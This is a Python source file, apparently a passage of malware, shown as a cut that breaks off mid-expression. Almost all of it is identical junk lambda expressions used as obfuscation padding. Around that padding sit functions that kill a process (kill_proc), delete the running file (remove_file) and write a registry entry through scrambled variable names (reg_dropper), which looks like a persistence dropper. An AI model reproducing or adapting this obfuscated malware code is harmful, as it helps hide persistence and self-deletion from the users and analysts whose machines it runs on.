         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def kill_proc(our_pid):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    try:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        p = psutil.Process(our_pid)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        p.kill()
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
    except Exception as e:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        pass
    try:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        os.kill(our_pid, signal.SIGTERM)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
    except Exception as e:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        pass
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def remove_file(current_file):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    try:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        os.remove(current_file)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
    except Exception as e:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        pass
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
def reg_dropper(reg_path, reg_key, location):
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    try:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        boqwoubfobupwepuobg = cqwpinipgnipqwgqw(cnqwnipcqwipnwrf, reg_path, nipqnpcq,
                                                nmopvmqpomwovqotgqw)
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
